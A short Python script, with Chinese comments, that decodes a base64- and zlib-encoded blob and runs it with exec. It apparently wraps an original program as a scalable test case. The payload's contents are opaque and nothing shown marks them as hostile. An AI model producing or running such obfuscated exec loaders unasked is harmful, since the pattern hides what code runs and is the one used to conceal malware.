import zlib
import base64


def main(n):
    # n 不参与原逻辑（原程序是固定逻辑），按要求保留作“规模”参数
    payload = (
        b"eJyFV8lu2zAQPTdfIenAUGhR9FygXxLk4MJu4SJwAscJSIEfX4nLzHtDpT0kGM6+"
        b"j3w83IYfw8M0BhemL8M0+pBiWuYMBzdGtwjYgMUpWGRWtnFJq6Srkh7g4JqSjW9"
        b"Jm3wKjdYohIzALkivfuX/m02nYBUJ2ZNVLjZPAM5hrFTR5BFGasLg/RbOvPniIs"
        b"SU0AXAtMgMnanRShPVFx+QA+jRad5CyWhoMUbIqCBL0RII5jSZd+Fg+sLB7dpNW"
        b"OItRcaFNKqVyFpKgdkR9ELB2PpzhIJGt1amli/aSDlOQ1W5ymHiJFsYYHCkD0VZ"
        b"sMSmDSMl1XpmYM2R9HtTwgOYgCe3KLwXmJUdMRaiID+w28WKfGVICbfyzMaHNKq"
        b"36IWCC+Qp7gTLoVYRL+28GH6Pjb7JmDjJ1l6AsDu2CGFzJR5RM58wnDCZ/8it9n"
        b"lXgzYrihNlNr2dFmUoamj1pv961Y93meJ9B62u0gF2rkXzB3qlJziEzfWuYFHWP"
        b"JQLSrNZExXlgesBaI1S7dDm4v6AYYZkwNRD40AGaBck3vYLibQi4e7Mpzdhf7Yt"
        b"Agh+loaltc0HVw5zYkuEsS7ggJBtuAiJjOrDswaBanOqF9E6C7ebnO0wdKn5+Bj"
        b"M3k1HOl5245pj1yknlqH5iOnZ4TG5pSsPGSN7oesOHf3AbWGaglqiO/MpdM2Q3z"
        b"UjZBNwYFBD7Q46XvMWlWxICAFca8Mq7x2nQwpdqS0Pa6nXHaxAQUZTtby1qnH+Y"
        b"LH6sFyySaV6qRYumsLpNS4dRyPdzjkSFitEDDDFtXB6irVwggtgVE55RYBFZW4r"
        b"Wm62iMd91wK4JjOL11vfO9LMUS85aODCdWuK7Mu3g7BkuNqOLKSfJwXMY8k/hxL"
        b"iokkkR2bGIdiZtTWOCWVgH+1NYMPDXMl+q8siUffUp05hY4Q6alBt8DSSVi3jvl"
        b"zTAppNKU8dpwppDSokDq2uhenx7tfzdTgP58twPVx+n/z5clv/Xt5ufp7n73efX"
        b"q4b5ni4PZzeD09++vZzGj4P9/df/zyfL/7p/Hrz19P76fp6OqrcPD/Od38BvToe"
        b"hw=="
    )
    code = zlib.decompress(base64.b64decode(payload))
    # 原程序用 exec 执行解压后的代码
    exec(code, {"__name__": "__main__", "n": n})


if __name__ == "__main__":
    # 简单生成一个“规模”测试值；可按需要修改
    test_n = 10
    main(test_n)